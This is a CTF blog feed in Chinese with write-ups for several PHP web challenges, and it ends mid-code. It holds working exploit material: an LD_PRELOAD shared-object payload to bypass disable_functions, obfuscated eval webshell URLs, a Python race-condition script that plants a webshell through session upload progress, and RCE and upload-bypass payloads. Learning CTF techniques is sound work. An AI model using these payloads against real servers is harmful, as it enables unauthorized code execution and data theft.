<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">        system(<span class="string">&quot;ls / &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">        </span><br><span class="line">&#125;   </span><br><span class="line">__attribute__ ((__constructor__)) <span class="keyword">void</span> <span class="title function_">preload</span> <span class="params">(<span class="keyword">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这里就有一个配套的练习</p>
<p>[极客大挑战 2019]RCE ME</p>
<p>直接给源码</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">   @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>很正常的无字母，这里先去构造一个phpinfo()看看有没有什么信息</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="title function_">error_reporting</span><span class="params">(<span class="number">0</span>)</span>;</span><br><span class="line">$a=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line">echo <span class="string">&quot;?code=(~&quot;</span>.$b.<span class="string">&quot;)();&quot;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">//?code=(~%8F%97%8F%96%91%99%90)();</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这里它过滤了很多的函数，直接进行命令就不太可能，需要进行绕过Disable_Functions，可以先通过木马连接蚁剑方便后序的操作</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="title function_">error_reporting</span><span class="params">(<span class="number">0</span>)</span>;</span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[1]))&#x27;</span>;</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line">echo <span class="string">&quot;?code=(~&quot;</span>.$b.<span class="string">&quot;)(~&quot;</span>.$d.<span class="string">&quot;);&quot;</span>;</span><br><span class="line"><span class="comment">//?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>连接成功，这里有两个flag，第一个打开什么都没有，第二个是readflag一个可执行文件，但是无法正常执行，这里需要绕过disable_functions才可以正常的获得flag</p>
<p>可以通过蚁剑的插件来进行绕过，这里就不多讲了</p>
<p>现在通过LD_PRELOAD劫持来实现，需要先创建两个文件</p>
<p>一个php文件</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/var/tmp/1222.so&quot;</span>);<span class="comment">//这里改为对应文件即可</span></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>一个c语言文件</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;tail /flag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/readflag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">        </span><br><span class="line">&#125;   </span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>再通过kali将.c文件编译为.so文件进行上传即可</p>
<p><img src="https://luokuang1.github.io/images/jiec6.png" width="95%" height="60%"></p>
<p>最后通过一句话木马来进行文件包含即可</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%<span class="number">8D</span>%8B)(~%D7%9A%<span class="number">89</span>%9E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);</span><br><span class="line"><span class="number">1</span>=include(<span class="string">&quot;/var/tmp/shell1.php&quot;</span>);</span><br></pre></td></tr></table></figure>
</blockquote>
<p>最后就可以看到该目录多一个test.php，再打开就可以的flag</p>
]]></content>
      <tags>
        <tag>知识点 ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含条件竞争</title>
    <url>/2024/09/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    <content><![CDATA[<p>相关链接：<a href="https://www.freebuf.com/articles/web/288430.html">https://www.freebuf.com/articles/web/288430.html</a></p>
<p>这个一般是在文件上传题中发现无法上传成功，并且存在文件包含漏洞的时候就可以尝试是否存在条件竞争的条件</p>
<p>首先要进行条件竞争，就需要看以下.php.ini文件配置中的信息</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled = on</span><br><span class="line">session.upload_progress.cleanup = on</span><br><span class="line">session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled可以控制是否开启session.upload_progress功能</span><br><span class="line">session.upload_progress.cleanup可以控制是否在上传之后删除文件内容</span><br><span class="line">session.upload_progress.prefix可以设置上传文件内容的前缀</span><br><span class="line">session.upload_progress.name的值即为session中的键值</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这里简单的分析一下</p>
<p>session.upload_progres.enabled = on可以将我们上传的文件的信息存储在session中，这里就要去了解如何初始化session和如何来将信息写入session的</p>
<p>php.ini中session.use_strict_mode选项默认是0，在这个情况下，用户可以自己定义自己的sessionid，例如当用户在cookie中设置sessionid=flag时，PHP就会生成一个文件sess_flag,一般文件的地址在tmp临时目录下，此时也就初始化了session，并且会将上传的文件信息写入到文件/tmp/sess_flag中去，具体文件的内容是什么，后面会写到。</p>
<p>然后session.upload_progress.cleanup = on代表文件上传完成之后文件内容会被清除，这样就导致无法存储我们构造的payload，所以我们在这里就需要条件竞争来帮组我们进行获取</p>
<p>具体是因为在创建session文件时，到session清除之前会有一定的时间差，这样如果把握好中间的时间就可以来进行我们的文件包含，从而触发payload</p>
<p>这里就通过ctfshow web82的的题目来进行实验</p>
<p>首先需要先有一个文件包含的地方,这里就是一个参数file来实现文件包含</p>
<p>先看看题目源码：</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>); </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>); </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>); </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>); </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>一般的常见的session路径为/tmp 或 /var/lib/php/session目录下</p>
<p>这里的路径默认为/tmp/sess_PHPSESSID</p>
<p>这里没有一个上传的接口，就需要我们通过自己在本地来创造一个上传的接口这里要注意一下有关上传的参数name,这里的PHP_SESSION_UPLOAD_PROGRESS为包含的关键</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;https://xxxxxx/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php system(&#x27;cat f*&#x27;); ?&gt;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://luokuang1.github.io/images/wjbh1.png" width="100%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/wjbh2.png" width="100%" height="80%"></p>
<p>这个是文件包含的请求包</p>
<p><img src="https://luokuang1.github.io/images/wjbh3.png" width="100%" height="80%"></p>
<p>成功获取的报文是这样的</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">upload_progress_www-data</span><br><span class="line">|a:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;start_time&quot;</span>;i:<span class="number">1725970055</span>;s:<span class="number">14</span>:<span class="string">&quot;content_length&quot;</span>;i:<span class="number">368</span>;s:<span class="number">15</span>:<span class="string">&quot;bytes_processed&quot;</span>;i:<span class="number">368</span>;s:<span class="number">4</span>:<span class="string">&quot;done&quot;</span>;b:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;files&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;field_name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;wjsc.php&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;tmp_name&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;error&quot;</span>;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;done&quot;</span>;b:<span class="number">0</span>;s:<span class="number">10</span>:<span class="string">&quot;start_time&quot;</span>;i:<span class="number">1725970055</span>;s:<span class="number">15</span>:<span class="string">&quot;bytes_processed&quot;</span>;i:<span class="number">368</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>可以看到返回的报文，www-data就是PHP_SESSION_UPLOAD_PROGRESS的代码执行，这里就可以来进行任意文件执行，但是如果一直这样跑就比较麻烦</p>
<p>可以直接通过python脚本来帮助我们来实现文件包含的条件竞争，采用多线程来实现条件竞争</p>
<blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;exp&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;https://xxxxx.xx/&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;https://xxxxx.xx/?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;test.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure></blockquote>
]]></content>
      <tags>
        <tag>ctf 文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>BaseCTF2024题解</title>
    <url>/2024/09/25/BaseCTF2024%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a>[Week1] HTTP 是什么呀</h3><p>这个题考的是http基础知识</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>项目</strong></th>
<th><strong>你需要传入</strong></th>
<th><strong>当前传入值</strong></th>
<th><strong>是否正确</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>GET 参数 base</td>
<td>we1c%00me</td>
<td></td>
<td>close (请注意 URL 转义)</td>
</tr>
<tr>
<td>POST 参数 base</td>
<td>fl@g</td>
<td></td>
<td>close</td>
</tr>
<tr>
<td>Cookie c00k13</td>
<td>i can’t eat it</td>
<td></td>
<td>close</td>
</tr>
<tr>
<td>用户代理 (User-Agent)</td>
<td>Base</td>
<td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0</td>
<td>close</td>
</tr>
<tr>
<td>来源 (Referer)</td>
<td>Base</td>
<td></td>
<td>close</td>
</tr>
<tr>
<td>你的 IP</td>
<td>127.0.0.1</td>
<td>10.32.0.0</td>
<td>close</td>
</tr>
</tbody>
</table>
</div>
<p>首先需要通过get提交basectf的值为we1c%00me，但是需要注意在url里面%00为空格，所以需要通过将%00进行url编码，最后就是%2500 这样就可以?basectf=we1c%2500me</p>
<p>第二个直接通过hackerbar来post提交Base=fl@g即可</p>
<p>由于最后面一个要通过伪造ip地址，需要通过X-Forwarded-For来实现，所以我改为通过用bp来进行</p>
<p>请求报文：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /?basectf=we1c%<span class="number">2500</span>me HTTP/<span class="number">1.1</span> </span><br><span class="line">Host: challenge.basectf.fun:<span class="number">34690</span> </span><br><span class="line">Cache-Control: max-age=<span class="number">0</span> </span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span> </span><br><span class="line">User-Agent:Base </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,/;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span> </span><br><span class="line">Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=<span class="number">0.9</span> </span><br><span class="line">Connection: close </span><br><span class="line">Cookie: c00k13=i can<span class="string">&#x27;t eat it </span></span><br><span class="line"><span class="string">Referer: Base </span></span><br><span class="line"><span class="string">X-Forwarded-For: 127.0.0.1 </span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded </span></span><br><span class="line"><span class="string">Content-Length: 9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Base=fl@g</span></span><br></pre></td></tr></table></figure>
<p>success.php?flag=QmFzZUNURnsxOTE1ZDQ0Ni04NzFhLTRjNmUtYTgyOS0xYTgxMTQ0N2QxZWV9Cg==</p>
<p>最后base64解密即可获得flag</p>
<h3 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•`"></a>[Week1] 喵喵喵´•ﻌ•`</h3><p>知识点：rce</p>
<p>给出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="variable">$a</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;DT&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>直接提交DT=system(‘cat /*’);即可获得flag</p>
<h3 id="Week1-md5绕过"><a href="#Week1-md5绕过" class="headerlink" title="[Week1] md5绕过"></a>[Week1] md5绕过</h3><p>知识点：弱比较</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>]) )&#123;  </span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];  </span><br><span class="line"><span class="variable">$name2</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;name2&#x27;</span>];  </span><br><span class="line"><span class="variable">$password</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];  </span><br><span class="line"><span class="variable">$password2</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;    </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$name2</span> !== <span class="variable">$password2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name2</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$password2</span>))&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    </span><br><span class="line">&#125;    <span class="keyword">else</span>&#123;      </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;再看看啊，马上绕过嘞！&quot;</span>;    </span><br><span class="line">&#125;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;    </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;错啦错啦&quot;</span>; </span><br><span class="line">&#125;&#125;<span class="keyword">else</span> &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;没看到参数呐&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>第一层直接通过输入name和password两个不同字符串，但是md5值都是以0e开头即可，name2和password2通过数组来进行绕过，或者直接都通过数组绕过也可以</p>
<p>?name=QNKCDZO&amp;name2[]=1</p>
<p>password=240610708&amp;password2[]=2</p>
<h3 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a>[Week1] A Dark Room</h3><p>直接查看源码或者F12得flag</p>
<h3 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h3><p>知识点：文件上传</p>
<p>绕过方法通过mime绕过,直接修改</p>
<p>Content-Type: image/jpeg</p>
<p>上传1.php</p>
<p>&lt;?php system(‘ls’);?&gt;</p>
<p>来进行绕过，在查看/uploads/1.php得flag</p>
<h3 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h3><p>知识点：php伪协议</p>
<p>&lt;?php highlight<em>file(<em>_FILE</em></em>); // Aura 酱，欢迎回家~ // 这里有一份礼物，请你签收一下哟~ $pen = $_POST[‘pen’]; if (file_get_contents($pen) !== ‘Aura’) {   die(‘这是 Aura 的礼物，你不是 Aura！’); } // 礼物收到啦，接下来要去博客里面写下感想哦~ $challenge = $_POST[‘challenge’]; if (strpos($challenge, ‘<a href="http://jasmineaura.github.io">http://jasmineaura.github.io</a>‘) !== 0) {   die(‘这不是 Aura 的博客！’); } $blog_content = file_get_contents($challenge); if (strpos($blog_content, ‘已经收到Kengwang的礼物啦’) === false) {   die(‘请去博客里面写下感想哦~’); } // 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ $gift = $_POST[‘gift’]; include($gift);</p>
<p>这里我就不去将代码展开了，首先会通过file_get_contents()函数来获取pen里面得内容，可以通过data伪协议或者php://input写入，然后就是判断<a href="http://jasmineaura.github.io是否在challenge参数得开头，再通过file_get_contents($challenge)来发起http请求，查看是否有">http://jasmineaura.github.io是否在challenge参数得开头，再通过file_get_contents($challenge)来发起http请求，查看是否有</a> 已经收到Kengwang的礼物啦 这一句话，这里就可以通过覆盖前面得url来进行绕过通过@符号，最后就是通过php://filter来读取flag.php</p>
<p>pen=data://text/plain,Aura&amp;challenge=<a href="http://jasmineaura.github.io@challenge.basectf.fun:25499&amp;gift=php://filter/read=convert.base64-encode/resource=flag.php">http://jasmineaura.github.io@challenge.basectf.fun:25499&amp;gift=php://filter/read=convert.base64-encode/resource=flag.php</a></p>
<p>再通过base64解码就可以获取flag</p>
<h3 id="Week2-ez-ser"><a href="#Week2-ez-ser" class="headerlink" title="[Week2]  ez_ser"></a>[Week2]  ez_ser</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span 